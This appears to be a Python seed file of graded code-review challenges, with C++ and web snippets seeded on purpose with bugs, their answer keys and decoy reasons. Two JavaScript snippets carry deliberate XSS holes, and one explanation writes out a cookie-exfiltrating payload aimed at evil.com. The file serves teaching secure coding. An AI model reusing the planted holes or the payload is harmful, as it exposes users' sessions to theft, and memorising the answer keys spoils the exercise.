"""
Seed content for Code Review challenges (see models.CodeReviewChallenge,
routers/code_review.py): a longer snippet (~20-30 lines), each seeded with
1-3 real bugs or code smells pulled from well-known categories (off-by-one,
dangling references, XSS, race conditions, etc). Objectively graded: the
user clicks the line(s) they think are buggy, then matches each flagged
line to a reason from an answer bank (the real reasons for every issue in
the snippet, padded with plausible decoys) - see routers/code_review.py for
the grading logic.

Snippets are authored with inline `marker` tokens (e.g. "\u2021bug1\u2021") on the
line each issue lives on, rather than hand-counted line numbers - _build()
below locates each marker, records its 1-indexed line number, and strips the
marker out of the snippet text before it's ever seeded/served. This keeps
authoring safe against off-by-one mistakes when snippets get edited.

Two entries per difficulty tier per track (matches this track's weekday
cadence - see config.WEEKDAY_DIFFICULTY); expand over time the same way the
other content banks have.
"""
import re


def _build(snippet: str, issues: list[dict], distractor_reasons: list[str]) -> dict:
    """issues: [{"marker": "...", "reason": "...", "explanation": "..."}, ...]
    Returns {"snippet": <marker-free>, "issues": [{"line", "reason", "explanation"}, ...],
    "distractor_reasons": [...]}."""
    lines = snippet.split("\n")
    built_issues = []
    for spec in issues:
        marker = spec["marker"]
        for i, line in enumerate(lines):
            if marker in line:
                built_issues.append({"line": i + 1, "reason": spec["reason"], "explanation": spec["explanation"]})
                lines[i] = re.sub(r"\s*" + re.escape(marker), "", line)
                break
        else:
            raise ValueError(f"marker {marker!r} not found in snippet")
    return {
        "snippet": "\n".join(lines),
        "issues": built_issues,
        "distractor_reasons": distractor_reasons,
    }


def _entry(difficulty: str, topic: str, title: str, snippet: str, issues: list[dict], distractor_reasons: list[str]) -> dict:
    return {
        "difficulty": difficulty,
        "topic": topic,
        "title": title,
        **_build(snippet, issues, distractor_reasons),
    }


CODE_REVIEW_CHALLENGES = {
    "cpp_core": [
        _entry(
            "easy", "Loops & Bounds", "Sum an Array",
            "#include <vector>\n"
            "#include <string>\n"
            "\n"
            "// Computes the average of a batch of order totals for the\n"
            "// daily summary report.\n"
            "double average(const std::vector<double>& values) {\n"
            "    double sum = 0;\n"
            "    for (int i = 0; i <= values.size(); i++) {  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "        sum += values[i];\n"
            "    }\n"
            "    return sum / values.size();\n"
            "}\n"
            "\n"
            "int main() {\n"
            "    std::vector<double> orderTotals = {19.99, 42.50, 7.25, 100.00};\n"
            "    double avg = average(orderTotals);\n"
            "    printf(\"Average order total: %.2f\\n\", avg);\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Off-by-one bounds error",
                "explanation": (
                    "`i <= values.size()` runs one iteration too many, so on the last pass `values[i]` reads one "
                    "element past the end of the vector - undefined behavior (`vector::size()` returns a `size_t`, "
                    "so `i` implicitly converts, but the real bug is the `<=`). Should be `i < values.size()`."
                ),
            }],
            ["Unused variable", "Missing const correctness", "Redundant copy instead of reference"],
        ),
        _entry(
            "easy", "Floating Point", "Price Comparison",
            "#include <vector>\n"
            "\n"
            "struct CartItem {\n"
            "    std::string name;\n"
            "    double price;\n"
            "};\n"
            "\n"
            "// Free shipping kicks in once the order crosses $50.\n"
            "bool isFreeShipping(const std::vector<CartItem>& cart) {\n"
            "    double threshold = 50.00;\n"
            "    double total = 0;\n"
            "    for (const auto& item : cart) {\n"
            "        total += item.price;\n"
            "    }\n"
            "    return total == threshold;  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "}\n"
            "\n"
            "int main() {\n"
            "    std::vector<CartItem> cart = {{\"Boots\", 19.99}, {\"Socks\", 15.01}, {\"Laces\", 15.00}};\n"
            "    bool free = isFreeShipping(cart);\n"
            "    printf(\"Free shipping: %s\\n\", free ? \"yes\" : \"no\");\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Comparing floats with ==",
                "explanation": (
                    "Comparing floating-point values with `==` - accumulated rounding error means `total` is almost "
                    "never exactly `50.00` even when the math 'should' work out, so this silently returns false when "
                    "it shouldn't. Compare with a small epsilon tolerance, or better, do money math in integer cents."
                ),
            }],
            ["Missing include guard", "Magic number should be a named constant", "Unnecessary heap allocation"],
        ),
        _entry(
            "medium", "Lifetimes", "Dangling Reference",
            "#include <string>\n"
            "\n"
            "// Used by the log formatter to grab a quick label for the\n"
            "// first word of a request line.\n"
            "const std::string& firstWord(const std::string& sentence) {\n"
            "    std::string word = sentence.substr(0, sentence.find(' '));  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "    return word;\n"
            "}\n"
            "\n"
            "void logRequestLine(const std::string& line) {\n"
            "    const std::string& tag = firstWord(line);\n"
            "    printf(\"[%s] %s\\n\", tag.c_str(), line.c_str());\n"
            "}\n"
            "\n"
            "int main() {\n"
            "    logRequestLine(\"GET /api/orders HTTP/1.1\");\n"
            "    logRequestLine(\"POST /api/checkout HTTP/1.1\");\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Dangling reference to a local",
                "explanation": (
                    "`firstWord` returns a reference to `word`, a local variable destroyed the moment the function "
                    "returns - the caller ends up with a dangling reference to freed memory, undefined behavior on "
                    "first use. Either return `std::string` by value (RVO/move makes this cheap) or take an output "
                    "parameter - never return a reference to a local."
                ),
            }],
            ["Unused variable", "Inconsistent naming convention", "Missing const correctness"],
        ),
        _entry(
            "medium", "RAII", "Leaky Parser",
            "#include <string>\n"
            "\n"
            "struct Request {\n"
            "    explicit Request(const std::string& raw) : raw_(raw) {}\n"
            "    bool isValid() const { return !raw_.empty(); }\n"
            "    std::string raw_;\n"
            "};\n"
            "\n"
            "void logError(const std::string& msg);\n"
            "void process(Request* req);\n"
            "\n"
            "void handleRequest(const std::string& raw) {\n"
            "    Request* req = new Request(raw);\n"
            "    if (!req->isValid()) {\n"
            "        logError(\"bad request\");\n"
            "        return;  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "    }\n"
            "    process(req);\n"
            "    delete req;\n"
            "}\n"
            "\n"
            "int main() {\n"
            "    handleRequest(\"\");\n"
            "    handleRequest(\"GET /health\");\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Memory leak on early return",
                "explanation": (
                    "If `isValid()` is false, the function returns without ever calling `delete req` - a leak. It "
                    "also leaks if `process(req)` throws, since `delete req` never runs on that path either. Fix by "
                    "using `std::unique_ptr<Request>` so cleanup happens automatically via RAII on every exit path, "
                    "instead of manual `new`/`delete`."
                ),
            }],
            ["No self-assignment check", "Public data member instead of encapsulated", "Dangling reference to a local"],
        ),
        _entry(
            "hard", "Concurrency", "Shared Counter",
            "#include <thread>\n"
            "#include <vector>\n"
            "\n"
            "// requestCount is read by a background reporter thread and\n"
            "// incremented once per request across a pool of worker threads.\n"
            "int requestCount = 0;\n"
            "\n"
            "void onRequestHandled() {\n"
            "    requestCount++;  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "}\n"
            "\n"
            "void worker(int requestsToHandle) {\n"
            "    for (int i = 0; i < requestsToHandle; i++) {\n"
            "        onRequestHandled();\n"
            "    }\n"
            "}\n"
            "\n"
            "int main() {\n"
            "    std::vector<std::thread> pool;\n"
            "    for (int i = 0; i < 8; i++) {\n"
            "        pool.emplace_back(worker, 10000);\n"
            "    }\n"
            "    for (auto& t : pool) t.join();\n"
            "    printf(\"total requests: %d\\n\", requestCount);\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Data race on shared state",
                "explanation": (
                    "`requestCount++` is a read-modify-write that isn't atomic, and 8 worker threads call it "
                    "concurrently with no synchronization - increments can be lost (two threads read the same value "
                    "before either writes back), and it's technically undefined behavior in C++ (unsynchronized "
                    "concurrent access to a non-atomic variable with at least one write). Fix with `std::atomic<int>` "
                    "or a mutex guarding the increment."
                ),
            }],
            ["Uninitialized variable used", "Unused variable", "Iterator invalidated after erase"],
        ),
        _entry(
            "hard", "Iterators", "Remove Expired Entries",
            "#include <vector>\n"
            "\n"
            "struct Session {\n"
            "    bool isExpired() const;\n"
            "    std::string id;\n"
            "};\n"
            "\n"
            "// Runs on a timer every minute to sweep out expired sessions.\n"
            "void removeExpired(std::vector<Session>& sessions) {\n"
            "    for (auto it = sessions.begin(); it != sessions.end(); ++it) {\n"
            "        if (it->isExpired()) {\n"
            "            sessions.erase(it);  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "        }\n"
            "    }\n"
            "}\n"
            "\n"
            "int main() {\n"
            "    std::vector<Session> sessions = {\n"
            "        {\"s1\"}, {\"s2\"}, {\"s3\"}, {\"s4\"},\n"
            "    };\n"
            "    removeExpired(sessions);\n"
            "    printf(\"sessions remaining: %zu\\n\", sessions.size());\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Iterator invalidated after erase",
                "explanation": (
                    "`vector::erase(it)` invalidates `it` and every iterator after it, but the loop's `++it` then "
                    "advances the now-dangling iterator anyway - undefined behavior (and if it happens to 'work', it "
                    "silently skips the element right after every erased one). `erase` returns the next valid "
                    "iterator - assign it back (`it = sessions.erase(it);`) and only `++it` in the non-erase branch, "
                    "or use the erase-remove idiom instead."
                ),
            }],
            ["Off-by-one bounds error", "Memory leak on early return", "Missing const correctness"],
        ),
        _entry(
            "expert", "Rule of Three", "Copy Assignment",
            "#include <cstring>\n"
            "\n"
            "class Buffer {\n"
            "public:\n"
            "    Buffer(size_t len) : len_(len), data_(new char[len]) {}\n"
            "    ~Buffer() { delete[] data_; }\n"
            "\n"
            "    Buffer& operator=(const Buffer& other) {\n"
            "        delete[] data_;  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "        len_ = other.len_;\n"
            "        data_ = new char[len_];\n"
            "        memcpy(data_, other.data_, len_);\n"
            "        return *this;\n"
            "    }\n"
            "\n"
            "private:\n"
            "    size_t len_;\n"
            "    char* data_;\n"
            "};\n"
            "\n"
            "int main() {\n"
            "    Buffer b(16);\n"
            "    b = b;  // self-assignment\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "No self-assignment check",
                "explanation": (
                    "`b = b;` first does `delete[] data_`, freeing the buffer - but `other` *is* `*this`, so "
                    "`other.data_`/`other.len_` are now reading freed memory before the copy even starts, and "
                    "`memcpy` copies garbage into a freshly-allocated buffer. Guard with `if (this == &other) return "
                    "*this;` at the top, or use the copy-and-swap idiom, which sidesteps the problem entirely."
                ),
            }],
            ["Object slicing via pass-by-value", "Data race on shared state", "Integer overflow"],
        ),
        _entry(
            "expert", "Polymorphism", "Process a Shape",
            "#include <iostream>\n"
            "\n"
            "class Shape {\n"
            "public:\n"
            "    virtual double area() const { return 0.0; }\n"
            "    virtual ~Shape() = default;\n"
            "};\n"
            "\n"
            "class Circle : public Shape {\n"
            "public:\n"
            "    explicit Circle(double r) : r_(r) {}\n"
            "    double area() const override { return 3.14159 * r_ * r_; }\n"
            "private:\n"
            "    double r_;\n"
            "};\n"
            "\n"
            "void logArea(Shape shape) {  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "    std::cout << \"area: \" << shape.area() << \"\\n\";\n"
            "}\n"
            "\n"
            "int main() {\n"
            "    Circle c(5.0);\n"
            "    logArea(c);\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Object slicing via pass-by-value",
                "explanation": (
                    "`logArea` takes `Shape` by value, so passing a `Circle` copies only the `Shape` base-class "
                    "portion into a new, plain `Shape` object - `shape.area()` calls `Shape::area()`, not the "
                    "overridden `Circle::area()`, even though `area()` is virtual. Polymorphism through a by-value "
                    "parameter never works; take `const Shape&` (or a pointer) instead so the virtual call dispatches "
                    "correctly."
                ),
            }],
            ["No self-assignment check", "Missing const correctness", "Unused variable"],
        ),
    ],
    "html_css": [
        _entry(
            "easy", "Accessibility", "Product Image",
            "<article class=\"product-card\">\n"
            "  <a href=\"/products/hiking-boots\">\n"
            "    <img src=\"/img/hiking-boots.jpg\">  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "  </a>\n"
            "  <h3>Trailblazer Hiking Boots</h3>\n"
            "  <p class=\"price\">$89.99</p>\n"
            "  <ul class=\"badges\">\n"
            "    <li>Free returns</li>\n"
            "    <li>In stock</li>\n"
            "  </ul>\n"
            "  <button type=\"button\" class=\"add-to-cart\">Add to cart</button>\n"
            "</article>\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Missing alt text",
                "explanation": (
                    "Missing `alt` text on an informative image - screen readers announce it as just 'image' (or "
                    "the raw filename in some browsers), giving a blind user no idea what's being sold. Add a "
                    "descriptive `alt=\"Trailblazer Hiking Boots\"`; only purely decorative images should get "
                    "`alt=\"\"`."
                ),
            }],
            ["z-index without positioning", "Non-semantic div used for interactive control", "Overuse of !important"],
        ),
        _entry(
            "easy", "Semantic HTML", "Clickable Card",
            "<section class=\"catalog\">\n"
            "  <h2>Featured</h2>\n"
            "  <div class=\"card\" onclick=\"openProduct(42)\">  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "    <img src=\"/img/hiking-boots.jpg\" alt=\"Trailblazer Hiking Boots\">\n"
            "    <h3>Trailblazer Hiking Boots</h3>\n"
            "    <p>View details</p>\n"
            "  </div>\n"
            "  <div class=\"card\" onclick=\"openProduct(43)\">\n"
            "    <img src=\"/img/trail-socks.jpg\" alt=\"Trail Socks\">\n"
            "    <h3>Trail Socks</h3>\n"
            "    <p>View details</p>\n"
            "  </div>\n"
            "</section>\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Non-semantic div used for interactive control",
                "explanation": (
                    "A `<div onclick>` isn't keyboard-focusable or announced as interactive by screen readers - a "
                    "keyboard-only or screen-reader user has no way to activate it. Use a real `<button>` (or an "
                    "`<a>` if it's real navigation), which gets focus, Enter/Space activation, and correct semantics "
                    "for free."
                ),
            }],
            ["Missing alt text", "Missing form label association", "Color contrast too low for accessibility"],
        ),
        _entry(
            "medium", "Positioning", "Dropdown Menu",
            ".nav {\n"
            "  display: flex;\n"
            "  align-items: center;\n"
            "  gap: 16px;\n"
            "}\n"
            "\n"
            ".dropdown {\n"
            "  position: relative;\n"
            "}\n"
            "\n"
            ".dropdown-menu {\n"
            "  z-index: 999;  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "  top: 100%;\n"
            "  left: 0;\n"
            "  min-width: 180px;\n"
            "  background: white;\n"
            "  box-shadow: 0 2px 8px rgba(0,0,0,0.2);\n"
            "}\n"
            "\n"
            ".dropdown-menu.open {\n"
            "  display: block;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "z-index without positioning",
                "explanation": (
                    "`z-index` only has an effect on a positioned element (`position` set to anything other than the "
                    "default `static`) - without a `position` declaration on `.dropdown-menu` itself, this `z-index: "
                    "999` does nothing, and the dropdown can still render behind other content. Add `position: "
                    "absolute` alongside it."
                ),
            }],
            ["Missing alt text", "XSS via unescaped innerHTML", "Unscoped global CSS selector"],
        ),
        _entry(
            "medium", "Specificity", "Theming Override",
            ":root {\n"
            "  --brand-blue: #2b6cff;\n"
            "}\n"
            "\n"
            ".btn {\n"
            "  padding: 10px 18px;\n"
            "  border-radius: 6px;\n"
            "}\n"
            "\n"
            ".btn-primary {\n"
            "  background: var(--brand-blue);\n"
            "}\n"
            "\n"
            "#header .btn-primary {\n"
            "  background: var(--brand-blue) !important;  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "}\n"
            "\n"
            ".btn-primary:hover {\n"
            "  filter: brightness(1.1);\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Overuse of !important",
                "explanation": (
                    "Reaching for `!important` to beat an ID selector's specificity is a smell, not a fix - it wins "
                    "this battle but makes every future override of `#header .btn-primary` need `!important` too, "
                    "escalating indefinitely. Fix the actual cause (an ID selector styling a reusable component) "
                    "rather than papering over it."
                ),
            }],
            ["Missing viewport meta tag", "Layout thrashing from forced reflow", "z-index without positioning"],
        ),
        _entry(
            "hard", "Security", "Comment Renderer",
            "function fetchComments(postId) {\n"
            "  return fetch(`/api/posts/${postId}/comments`).then(r => r.json());\n"
            "}\n"
            "\n"
            "function renderComment(comment) {\n"
            "  const el = document.getElementById('comments');\n"
            "  el.innerHTML += `<div class=\"comment\">${comment.author}: ${comment.text}</div>`;  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "}\n"
            "\n"
            "async function loadComments(postId) {\n"
            "  const comments = await fetchComments(postId);\n"
            "  document.getElementById('comments').innerHTML = '';\n"
            "  comments.forEach(renderComment);\n"
            "}\n"
            "\n"
            "document.addEventListener('DOMContentLoaded', () => {\n"
            "  loadComments(window.CURRENT_POST_ID);\n"
            "});\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "XSS via unescaped innerHTML",
                "explanation": (
                    "Stored/reflected XSS: `comment.text` (and `.author`) come from user input and get concatenated "
                    "straight into `innerHTML` with no escaping - a comment containing `<img src=x "
                    "onerror=\"steal()\">` executes arbitrary JS for every viewer. Use `textContent`/`createElement` "
                    "for user-supplied text, or run it through a proper HTML-escaping function before interpolating."
                ),
            }],
            ["z-index without positioning", "Unscoped global CSS selector", "Missing form label association"],
        ),
        _entry(
            "hard", "Responsive Design", "Sidebar Layout",
            ".page {\n"
            "  display: flex;\n"
            "  min-height: 100vh;\n"
            "}\n"
            "\n"
            ".sidebar {\n"
            "  width: 320px;  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "  flex-shrink: 0;\n"
            "  background: #1a1a2e;\n"
            "}\n"
            "\n"
            ".content {\n"
            "  width: 900px;\n"
            "  padding: 24px;\n"
            "}\n"
            "\n"
            ".content h1 {\n"
            "  font-size: 1.8rem;\n"
            "  margin-bottom: 12px;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Fixed pixel widths break responsiveness",
                "explanation": (
                    "Fixed pixel widths on both flex children add up to 1220px regardless of viewport size - on any "
                    "screen narrower than that (most phones), the layout overflows and forces horizontal scrolling "
                    "instead of reflowing. Give `.content` `flex: 1` (or a `max-width` + `min-width: 0`) so it "
                    "shrinks with the viewport instead of a hardcoded width."
                ),
            }],
            ["Missing alt text", "Overuse of !important", "Color contrast too low for accessibility"],
        ),
        _entry(
            "expert", "Media Queries", "Mobile-First Breakpoints",
            ".nav {\n"
            "  display: flex;\n"
            "  flex-direction: column;\n"
            "}\n"
            "\n"
            "@media (min-width: 1024px) {\n"
            "  .nav { display: none; }\n"
            "}\n"
            "\n"
            "@media (min-width: 640px) {  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "  .nav { display: flex; flex-direction: row; }\n"
            "}\n"
            "\n"
            ".nav-toggle {\n"
            "  display: block;\n"
            "}\n"
            "\n"
            "@media (min-width: 640px) {\n"
            "  .nav-toggle { display: none; }\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Media query source-order bug",
                "explanation": (
                    "Source-order bug: both rules have equal specificity, so on any viewport >=1024px CSS's cascade "
                    "applies the *later* rule (`min-width: 640px`, which also matches) last, silently un-hiding the "
                    "nav the first rule just hid. Mobile-first breakpoints need to be written in ascending order "
                    "(smallest `min-width` first) so each wider rule correctly overrides the narrower one before it."
                ),
            }],
            ["Fixed pixel widths break responsiveness", "Missing viewport meta tag", "Unscoped global CSS selector"],
        ),
        _entry(
            "expert", "Security", "Search Results Template",
            "function escapeHtml(str) {\n"
            "  const div = document.createElement('div');\n"
            "  div.textContent = str;\n"
            "  return div.innerHTML;\n"
            "}\n"
            "\n"
            "function showResults(query, results) {\n"
            "  document.getElementById('heading').innerHTML = `Results for \"${query}\"`;  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "  const list = document.getElementById('results-list');\n"
            "  list.innerHTML = '';\n"
            "  results.forEach(r => {\n"
            "    list.innerHTML += `<li>${r.title}</li>`;  \xe2\x80\xa1bug2\xe2\x80\xa1\n"
            "  });\n"
            "}\n"
            "\n"
            "document.getElementById('search-form').addEventListener('submit', (e) => {\n"
            "  e.preventDefault();\n"
            "  const query = document.getElementById('search-input').value;\n"
            "  runSearch(query).then(results => showResults(query, results));\n"
            "});\n",
            [
                {
                    "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                    "reason": "XSS via unescaped innerHTML",
                    "explanation": (
                        "The search `query` comes straight from user input (the search box/URL) and is interpolated "
                        "into `innerHTML` unescaped - a query like `<img src=x onerror=\"fetch('//evil.com?c='+"
                        "document.cookie)\">` runs in every visitor's session. `escapeHtml` is defined right above "
                        "but never used here."
                    ),
                },
                {
                    "marker": "\xe2\x80\xa1bug2\xe2\x80\xa1",
                    "reason": "XSS via unescaped innerHTML",
                    "explanation": (
                        "Each result's `title` (user-generated content, e.g. a product listing name) gets the same "
                        "unescaped treatment inside the loop, giving a second injection point. Both spots should "
                        "route through `escapeHtml` (or build the DOM with `textContent`/`createElement`) instead of "
                        "string-concatenated `innerHTML`."
                    ),
                },
            ],
            ["Missing form label association", "Media query source-order bug", "Layout thrashing from forced reflow"],
        ),
    ],
}
